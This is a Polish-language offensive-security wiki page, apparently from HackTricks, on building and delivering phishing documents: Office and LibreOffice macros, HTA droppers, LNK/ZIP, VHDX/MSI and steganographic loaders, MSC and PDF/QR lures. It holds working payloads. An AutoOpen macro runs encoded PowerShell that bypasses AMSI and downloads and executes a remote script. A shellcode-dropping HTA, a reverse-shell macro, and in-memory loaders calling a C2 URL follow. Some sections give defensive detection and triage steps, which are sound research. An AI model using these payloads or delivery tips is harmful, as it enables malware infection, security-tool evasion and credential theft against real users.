# Pliki i dokumenty phishingowe

{{#include ../../banners/hacktricks-training.md}}

## Dokumenty Office

Microsoft Word weryfikuje dane pliku przed jego otwarciem. Weryfikacja danych polega na identyfikacji struktury danych zgodnie ze standardem OfficeOpenXML. Jeśli podczas identyfikacji struktury danych wystąpi błąd, analizowany plik nie zostanie otwarty.

Pliki Word zawierające makra zazwyczaj używają rozszerzenia `.docm`. Można jednak zmienić rozszerzenie pliku, zachowując możliwość wykonywania makr.\
Na przykład plik RTF nie obsługuje makr, ale plik DOCM ze zmienionym rozszerzeniem na RTF zostanie obsłużony przez Microsoft Word i będzie mógł wykonywać makra.\
Te same mechanizmy i zasady działania dotyczą wszystkich programów z pakietu Microsoft Office (Excel, PowerPoint itd.).

Możesz użyć następującego polecenia, aby sprawdzić, które rozszerzenia będą obsługiwane przez niektóre programy Office:

```bash
assoc | findstr /i "word excel powerp"
```

Pliki DOCX odwołujące się do zdalnego szablonu (File –Options –Add-ins –Manage: Templates –Go), który zawiera makra, również mogą „wykonywać” makra.

### Ładowanie zewnętrznych obrazów

Przejdź do: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![Dokumenty Office — ładowanie zewnętrznych obrazów: przejdź do: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

Aby przeanalizować otrzymany dokument, zamiast go tworzyć, zobacz [analizę makr VBA: kod zaśmiecający i UserForms](../basic-forensic-methodology/specific-software-file-type-tricks/office-file-analysis.md#vba-macro-analysis-junk-code-and-userforms).

### Backdoor w makrach

Makra mogą służyć do uruchamiania dowolnego kodu z dokumentu.

#### Funkcje uruchamiane automatycznie

Im częściej są używane, tym większe prawdopodobieństwo, że wykryje je AV.

- AutoOpen()
- Document_Open()

#### Przykłady kodu makr

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Ręczne usuwanie metadanych

Przejdź do **File > Info > Inspect Document > Inspect Document**, aby otworzyć Inspektora dokumentów. Kliknij **Inspect**, a następnie **Remove All** obok **Document Properties and Personal Information**.

#### Rozszerzenie dokumentu

Po zakończeniu wybierz listę rozwijaną **Save as type** i zmień format z **`.docx`** na Word 97-2003 **`.doc`**.\
Zrób to, ponieważ **nie można zapisywać makr w pliku `.docx`**, a rozszerzenie **`.docm`** z obsługą makr ma **złą reputację** (np. ikona miniatury ma duży znak `!`, a niektóre bramki internetowe/pocztowe całkowicie blokują takie pliki). Dlatego starsze **rozszerzenie `.doc` to najlepszy kompromis**.

#### Generatory złośliwych makr

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Makra automatycznie uruchamiane w LibreOffice ODT (Basic)

Dokumenty LibreOffice Writer mogą zawierać makra Basic, które uruchamiają się automatycznie po otwarciu pliku, jeśli makro zostanie przypisane do zdarzenia **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Proste makro reverse shell wygląda tak:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Zwróć uwagę na podwójne cudzysłowy (`""`) wewnątrz ciągu — LibreOffice Basic używa ich do zapisywania dosłownych cudzysłowów, więc payloady kończące się na `...==""")` zachowują poprawne sparowanie zarówno wewnętrznego polecenia, jak i argumentu Shell.

Wskazówki dotyczące dostarczenia:

- Zapisz plik jako `.odt` i przypisz makro do zdarzenia dokumentu, aby uruchamiało się natychmiast po jego otwarciu.
- Wysyłając wiadomość e-mail za pomocą `swaks`, użyj `--attach @resume.odt` (`@` jest wymagane, aby jako załącznik zostały wysłane bajty pliku, a nie ciąg znaków z jego nazwą). Ma to kluczowe znaczenie przy nadużywaniu serwerów SMTP, które akceptują dowolnych odbiorców `RCPT TO` bez weryfikacji.

## Pliki HTA

HTA to program Windows, który **łączy HTML z językami skryptowymi (takimi jak VBScript i JScript)**. Generuje interfejs użytkownika i wykonuje się jako aplikacja „w pełni zaufana”, bez ograniczeń modelu bezpieczeństwa przeglądarki.

HTA jest uruchamiany za pomocą **`mshta.exe`**, który jest zazwyczaj **instalowany** razem z **Internet Explorerem**, przez co **`mshta` zależy od IE**. Jeśli więc IE został odinstalowany, pliki HTA nie będą mogły się uruchomić.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## Fałszywe karty załączników w wiadomościach e-mail HTML

Wiadomość e-mail w formacie HTML może naśladować natywną kartę podglądu załącznika dostawcy, zamiast zawierać prawdziwy załącznik. Talos zaobserwował kartę Gmaila odtworzoną z czterech części MIME z obrazami PNG zakodowanymi w Base64. Cały element wizualny znajdował się w jednym odnośniku, a wartość odbiorcy w `?m=<target-id>` umożliwiała śledzenie poszczególnych odbiorców. Odnośnik zaczynał się od `//`, a nie od `http://` ani `https://`; przeglądarki obsługują taki zapis względny względem protokołu, ale ekstraktory URL dopasowujące tylko pełne adresy mogą go pominąć.<sup>[[11]](#references)</sup>

Podczas analizy sprawdzaj surowy MIME, zamiast ufać wyrenderowanej liście załączników. Ustal, jak części obrazów w treści tworzą wizualną kartę, znajdź otaczający ją odnośnik i normalizuj wartości `href` względne względem protokołu przed wyodrębnianiem URL-i.<sup>[[11]](#references)</sup>

Informacje o spoofingu nadawcy w kopercie/nagłówku i testowaniu zgodności DMARC znajdziesz w sekcji [SMTP mail spoofing countermeasures](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender).

## Wymuszanie uwierzytelniania NTLM

Istnieje kilka sposobów, by **zdalnie wymusić uwierzytelnianie NTLM**. Możesz na przykład dodać **niewidoczne obrazy** do wiadomości e-mail lub kodu HTML, który użytkownik otworzy (nawet podczas HTTP MitM?). Możesz też wysłać ofierze **adres plików**, które **wywołają** **uwierzytelnianie** już przy **otwarciu folderu**.

**Więcej informacji o tych i innych metodach znajdziesz na poniższych stronach:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Pamiętaj, że możesz nie tylko wykraść hash lub dane uwierzytelniające, ale także **przeprowadzać ataki NTLM relay**:

- [**Ataki NTLM Relay**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay do certyfikatów)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK do lokalnego uruchamiania poleceń przez `ftp.exe`

Skrót może uruchomić `ftp.exe -s:icon.ico`, używając tekstowego pliku poleceń zamaskowanego rozszerzeniem obrazu.<sup>[[12]](#references)</sup> Opcja `-s:` odczytuje lokalne polecenia FTP; w Windows 8 i nowszych plik musi być zakodowany w UTF-8.<sup>[[13]](#references)</sup> Wiersz zaczynający się od `!` uruchamia lokalne polecenie przez `cmd /c`, nie wysyłając go do serwera FTP. Ta ścieżka lokalnego wykonania nie wymaga połączenia FTP.<sup>[[14]](#references)</sup> W opisanym łańcuchu skrypt FTP odwoływał się do drugiego pliku poleceń. Istotny jest cały wiersz z `!`: samo `!more res.ico` wyświetla plik, natomiast potok do `cmd` wykonuje jego zawartość.<sup>[[12]](#references)[[14]](#references)</sup>

W tym samym łańcuchu użyto cyklicznego zadania, które ponownie odczytywało zapisywalny plik poleceń, zamiast instalować nowy plik wykonywalny przy każdej aktualizacji. Akcja zadania to `conhost --headless cmd /c more C:\Users\Public\Music\err.log|cmd`; plik zawierał polecenie pobierające instrukcje podczas uruchomienia. W pokrewnym wariancie przed zaplanowanym uruchomieniem pobierano zastępczy plik poleceń. Plik musi istnieć i być dostępny do odczytu w chwili uruchomienia zadania; `conhost` nie podnosi uprawnień zadania ponad skonfigurowany token użytkownika.<sup>[[12]](#references)</sup> Informacje o mechanice zadań znajdziesz w sekcji [scheduled-task execution](../../windows-hardening/lateral-movement/atexec.md).

## Skrót VHDX z ukrytym MSI i dokumentem-przynętą

Zamontowany plik VHDX może wyświetlać widoczny plik LNK, ukrywając jednocześnie MSI i arkusz kalkulacyjny-przynętę w tym samym woluminie. W opisanym łańcuchu LNK używał `cmd.exe /c Visa_Details.msi & Attachment-2.xls`. Separator `&` otwiera dokument-przynętę nawet wtedy, gdy polecenie instalatora zakończy się niepowodzeniem; otwarcie dokumentu nie dowodzi, że instalacja się powiodła. To wariant dostarczenia [wykonania niestandardowej akcji MSI](../../windows-hardening/windows-local-privilege-escalation/create-msi-with-wix.md), a nie samo w sobie podniesienie uprawnień przez MSI.<sup>[[12]](#references)</sup>

W tym MSI `CustomAction.Type` **194** łączy plik EXE przechowywany w tabeli `Binary` (**2**) z flagami ignorowania kodu powrotu (**64**) i wykonania asynchronicznego (**128**). Kombinacja **64 + 128** oznacza, że Windows Installer nie czeka na zakończenie pliku EXE; sama flaga 128 powodowałaby oczekiwanie do końca sekwencji.<sup>[[15]](#references)[[16]](#references)</sup> Przed przypisaniem wykonania osadzonemu plikowi EXE sprawdź wartość `Source` akcji w odniesieniu do tabeli `Binary` oraz jej położenie w `InstallExecuteSequence`.<sup>[[12]](#references)[[15]](#references)</sup> [Ścieżka WebDAV UNC może dostarczyć zdalny plik MSI](../../network-services-pentesting/pentesting-web/put-method-webdav.md#remote-msi-from-a-webdav-unc-path), ale jest to inny punkt wejścia.

## Loadery LNK + payloady osadzone w ZIP (łańcuch fileless)

Skuteczne kampanie dostarczają plik ZIP zawierający dwa legalnie wyglądające dokumenty-przynęty (PDF/DOCX) i złośliwy plik .lnk. Sztuczka polega na tym, że właściwy loader PowerShell jest zapisany w surowych bajtach ZIP-a za unikatowym znacznikiem, a plik .lnk wyodrębnia go i uruchamia w całości w pamięci.<sup>[[2]](#references)</sup>

Typowy przebieg realizowany przez jednolinijkowe polecenie PowerShell w pliku .lnk:

1) Znajdź oryginalny plik ZIP w typowych lokalizacjach: Desktop, Downloads, Documents, %TEMP%, %ProgramData% oraz katalogu nadrzędnym bieżącego katalogu roboczego.
2) Odczytaj bajty ZIP-a i znajdź zakodowany na stałe znacznik (np. xFIQCV). Wszystko za znacznikiem to osadzony payload PowerShell.
3) Skopiuj ZIP do %ProgramData%, rozpakuj go w tym miejscu i otwórz dokument-przynętę .docx, aby całość wyglądała wiarygodnie.
4) Omiń AMSI dla bieżącego procesu: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Usuń obfuskację kolejnego etapu (np. usuń wszystkie znaki #) i wykonaj go w pamięci.

Przykładowy szkielet PowerShell do wyodrębnienia i uruchomienia osadzonego etapu:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Uwagi
- Dostarczanie często wykorzystuje subdomeny renomowanych PaaS (np. *.herokuapp.com) i może ograniczać dostęp do payloadów (serwować nieszkodliwe pliki ZIP w zależności od IP/UA).
- Kolejny etap często odszyfrowuje shellcode zakodowany w base64/XOR i uruchamia go przez Reflection.Emit + VirtualAlloc, aby ograniczyć ślady na dysku.

Persistence używane w tym samym łańcuchu
- Hijacking COM TypeLib kontrolki Microsoft Web Browser, dzięki któremu IE/Explorer lub dowolna aplikacja osadzająca tę kontrolkę automatycznie ponownie uruchamia payload.<sup>[[2]](#references)[[4]](#references)</sup> Szczegóły i gotowe do użycia polecenia znajdziesz tutaj:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Poszukiwanie/IOC
- Pliki ZIP zawierające ciąg znaczników ASCII (np. xFIQCV) dołączony do danych archiwum.
- Plik .lnk, który przeszukuje foldery nadrzędne/użytkownika, aby znaleźć plik ZIP, a następnie otwiera dokument-przynętę.
- Manipulowanie AMSI przez [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Długie wątki biznesowe kończące się linkami hostowanymi w zaufanych domenach PaaS.

## Etapowanie z przynętą .lnk na pierwszym planie → persistence przez zaplanowane zadanie → side-loading zaufanego CPL

Kolejnym powtarzającym się wzorcem jest **plik `.lnk` podszywający się pod dokument**, który natychmiast otwiera nieszkodliwą przynętę, a w tle przygotowuje właściwy łańcuch.<sup>[[3]](#references)</sup>

Zaobserwowany przebieg:
1. Skrót **podszywa się pod plik PDF** i używa `conhost.exe` lub podobnego procesu-proxy do uruchomienia zaciemnionego downloadera PowerShell.
2. PowerShell rozdziela oczywiste tokeny (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), dzięki czemu naiwne mechanizmy wykrywania szukające `iwr`, `gci`, `ren`, `cpi` lub `schtasks` nie rozpoznają polecenia.
3. Stager najpierw pobiera **dokument-przynętę**, otwiera go dla ofiary, a następnie w tle odtwarza złośliwe pliki.
4. Payloady mogą być zapisywane z **nieprawidłowymi rozszerzeniami**, a następnie zmieniają nazwy po usunięciu znaków wypełniających, co opóźnia pojawienie się oczywistych artefaktów `.exe` / `.cpl`.
5. Persistence jest ustanawiane za pomocą **zaplanowanego zadania uruchamianego co minutę**, które uruchamia zaufany plik binarny hosta ze ścieżki, w której użytkownik może zapisywać pliki.

Minimalne wskazówki do poszukiwania w tym wzorcu:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Przydatny układ rozmieszczenia plików, który warto rozpoznawać:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` lub `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Dlaczego drugi etap jest trudny do wykrycia

W analizie przypadku Rapid7 zaplanowane zadanie wielokrotnie uruchamiało **`Fondue.exe`** z `C:\Users\Public\`. Ponieważ obok niego umieszczono **`APPWIZ.cpl`**, eksportujący **`RunFODW`**, zaufany plik binarny Microsoftu ładował bocznie CPL atakującego zamiast legalnej kopii systemowej.

CPL:
- Odczytuje blob **AES-256-CBC** z `C:\Windows\Tasks\editor.dat`
- Odszyfrowuje go za pomocą **Windows CNG / `bcrypt.dll`**
- Przydziela pamięć wykonywalną i kopiuje do niej odszyfrowany shellcode
- Uruchamia go pośrednio, przekazując wskaźnik do shellcode jako callback dla **`EnumUILanguagesW`**

Ten ostatni krok warto wyszukiwać osobno: malware często unika bezpośredniego skoku `((void(*)())buf)()` i zamiast tego nadużywa **legalnego WinAPI przyjmującego callback**, aby przekazać sterowanie.

Odszyfrowanym payloadem w tej kampanii był shellcode **Donut**, który następnie mapował końcowy PE w całości w pamięci i patchował **AMSI/WLDP/ETW** w bieżącym procesie przed przekazaniem mu sterowania. Więcej informacji o side-loadingu i przetwarzaniu post-exploitation w pamięci znajdziesz tutaj:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Praktyczne wskazówki do wyszukiwania:
- `.lnk` uruchamiający `powershell.exe` lub `conhost.exe`, po którym pojawia się widoczny dokument-przynęta.
- Krótkotrwałe pobrania do **`C:\Users\Public\`**, po których natychmiast następuje zmiana nazw plików z bezsensownymi rozszerzeniami.
- Zaplanowane zadania o niepozornych nazwach, takich jak `GoogleErrorReport`, uruchamiane z **katalogów zapisywalnych przez użytkownika**.
- Zaufane pliki binarne ładujące pliki **`.cpl` / `.dll`** z tego samego katalogu spoza systemu.
- Tekstowe bloby Base64 zapisywane w **`C:\Windows\Tasks\`**, a następnie odczytywane przez moduł ładowany bocznie.

## Payloady wyodrębniane z obrazów za pomocą separatorów steganograficznych (PowerShell stager)

Najnowsze łańcuchy loaderów dostarczają zaciemniony kod JavaScript/VBS, który dekoduje i uruchamia PowerShell stager zakodowany w Base64. Stager pobiera obraz (często GIF) zawierający ukryty jako zwykły tekst plik .NET DLL zakodowany w Base64, umieszczony między unikatowymi znacznikami początku i końca. Skrypt wyszukuje te separatory (przykłady zaobserwowane w środowisku: «<<sudo_png>> … <<sudo_odt>>>»), wyodrębnia tekst między nimi, dekoduje go z Base64 do bajtów, ładuje zestaw do pamięci i wywołuje znaną metodę wejściową, przekazując adres URL C2.<sup>[[5]](#references)</sup>

Przepływ pracy
- Etap 1: Archiwizowany dropper JS/VBS → dekoduje osadzone dane Base64 → uruchamia PowerShell stager z parametrami -nop -w hidden -ep bypass.
- Etap 2: PowerShell stager → pobiera obraz, wyodrębnia Base64 wyznaczone separatorami, ładuje .NET DLL do pamięci i wywołuje jej metodę (np. VAI), przekazując adres URL C2 i opcje.
- Etap 3: Loader pobiera końcowy payload i zwykle wstrzykuje go przez process hollowing do zaufanego pliku binarnego (często MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Więcej o process hollowing i proxy execution za pomocą zaufanych narzędzi znajdziesz tutaj:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Przykład PowerShella wyodrębniającego DLL z obrazu i wywołującego metodę .NET w pamięci:

<details>
<summary>Ekstraktor i loader steganograficznego payloadu PowerShell</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Uwagi
- To ATT&CK T1027.003 (steganografia/ukrywanie znaczników).<sup>[[6]](#references)</sup> Znaczniki różnią się między kampaniami.
- Obejście AMSI/ETW i deobfuskacja ciągów znaków są często stosowane przed załadowaniem assembly.
- Wykrywanie: skanuj pobrane obrazy w poszukiwaniu znanych separatorów; identyfikuj przypadki, gdy PowerShell uzyskuje dostęp do obrazów i natychmiast dekoduje bloki Base64.

Zobacz też narzędzia stego i techniki carvingu:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## Droppery JS/VBS → etapowanie PowerShell przez Base64

Powtarzającym się etapem początkowym jest mały, silnie zaciemniony plik `.js` lub `.vbs` dostarczany w archiwum. Jego jedynym celem jest zdekodowanie osadzonego ciągu Base64 i uruchomienie PowerShell z parametrami `-nop -w hidden -ep bypass`, aby pobrać kolejny etap przez HTTPS.<sup>[[5]](#references)</sup>

Szkielet logiki (abstrakcyjny):
- Odczytaj zawartość własnego pliku
- Znajdź blok Base64 między ciągami śmieciowymi
- Zdekoduj do postaci skryptu PowerShell w kodowaniu ASCII
- Wykonaj za pomocą `wscript.exe`/`cscript.exe`, uruchamiając `powershell.exe`

Wskazówki do wykrywania
- Załączniki JS/VBS w archiwach uruchamiające `powershell.exe` z `-enc`/`FromBase64String` w wierszu poleceń.
- `wscript.exe` uruchamiający `powershell.exe -nop -w hidden` ze ścieżek tymczasowych użytkownika.

## Dokumenty MSC jako kontenery wykonywania kodu (GrimResource)

Pliki Microsoft Management Console (`.msc`) to definicje konsoli w formacie XML, zwykle otwierane przez `mmc.exe`. **GrimResource** wykorzystuje odwołanie `StringTable` do zasobu `apds.dll` zawierającego stary prymityw XSS, przez co otwarcie spreparowanej konsoli przez użytkownika powoduje uruchomienie JavaScript w `mmc.exe`. Zaobserwowane próbki łączyły zaciemnianie oparte na `transformNode` z **DotNetToJScript**, aby utworzyć ładunek .NET bez typowej ścieżki makr Office.<sup>[[9]](#references)</sup>

Podczas wstępnej analizy statycznej traktuj niezaufany plik MSC jako tekst i **nie klikaj go dwukrotnie**:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Wysoce charakterystyczne zachowania w czasie działania to ładowanie przez `mmc.exe` CLR lub komponentów skryptowych, nawiązywanie połączeń sieciowych albo uruchamianie `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` lub nieoczekiwanego pliku wykonywalnego. Ten format jest legalny, dlatego wykrywanie powinno korelować **pochodzenie + podejrzaną zawartość XML/skryptu + zachowanie `mmc.exe`**, zamiast blokować każdy plik MSC.<sup>[[9]](#references)</sup>

## Przekierowania PDF/QR i warunkowe dostarczanie payloadu

PDF nie musi wykorzystywać exploita, by być użyteczny. W niedawnych kampaniach w dokumentach wyglądających na nieszkodliwe umieszczano **kod QR lub zwykły link**, który przenosił sesję przeglądarki poza kontrolę poczty i personalizował stronę docelową przy użyciu adresu odbiorcy. Microsoft udokumentował w 2025 roku pliki PDF, w których adresy URL kodów QR były unikalne dla każdego odbiorcy i prowadziły do infrastruktury wykradającej dane uwierzytelniające RaccoonO365; w równoległym łańcuchu, na podstawie adresu IP i środowiska, wybranym odwiedzającym zwracano ścieżkę JavaScript/MSI, a skanerom lub niedozwolonym klientom — nieszkodliwy plik PDF.<sup>[[10]](#references)</sup>

Podczas analizy sprawdź zarówno akcje PDF, jak i wyrenderowane kody QR. Kod QR może być narysowany wektorowo, a nie zapisany jako obraz możliwy do wyodrębnienia, dlatego zrasteryzuj każdą stronę i wyodrębnij osadzone obrazy:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Sprawdzaj zdekodowane adresy docelowe i przekierowania z odizolowanego systemu analitycznego, bez uwierzytelniania. Przydatne cechy do wyszukiwania to pliki PDF zawierające wyłącznie kody QR i niemal puste treści wiadomości, adres e-mail odbiorcy osadzony w parametrze zapytania, kilka przekierowań przez renomowane serwisy hostingowe oraz różna zawartość zwracana w zależności od adresu IP, geolokalizacji, plików cookie, strony odsyłającej lub user agenta. Porównuj żądania z użyciem kontrolowanych profili, ponieważ pojedyncze pobranie w sandboxie może zwrócić tylko przynętę.<sup>[[10]](#references)</sup>

## Pliki Windows służące do kradzieży hashy NTLM

Zobacz stronę o **miejscach, z których można wykraść dane uwierzytelniające NTLM**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – makro LibreOffice → webshell IIS → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – kampania ZipLine: zaawansowany atak phishingowy wymierzony w amerykańskie firmy](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – malware à la Mode: śledzenie taktyk grupy Dropping Elephant w łańcuchu loaderów nawiązującym do Chin](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Przejęcie TypeLib – nowa technika utrwalania się COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – loader PhantomVAI dostarcza różne programy kradnące informacje](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – steganografia (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – process hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – wykonywanie za pośrednictwem zaufanych narzędzi deweloperskich: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console do uzyskiwania początkowego dostępu i unikania wykrycia](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – cyberprzestępcy wykorzystują sezon rozliczeń podatkowych do prowadzenia kampanii phishingowych o tematyce podatkowej](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
- [11] [Cisco Talos – łańcuch dostarczania UAT-11587 i backdoor Antino](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
- [12] [FortiGuard Labs - BITTER rozszerza swój arsenał o PapRAT](https://www.fortinet.com/blog/threat-research/bitter-expands-its-arsenal-with-paprat)
- [13] [Microsoft Learn - polecenie ftp](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ftp)
- [14] [LOLBAS - Ftp.exe](https://lolbas-project.github.io/lolbas/Binaries/Ftp/)
- [15] [Microsoft Learn - niestandardowa akcja typu 2](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-type-2)
- [16] [Microsoft Learn - opcje przetwarzania wartości zwracanych przez niestandardową akcję](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-return-processing-options)
{{#include ../../banners/hacktricks-training.md}}
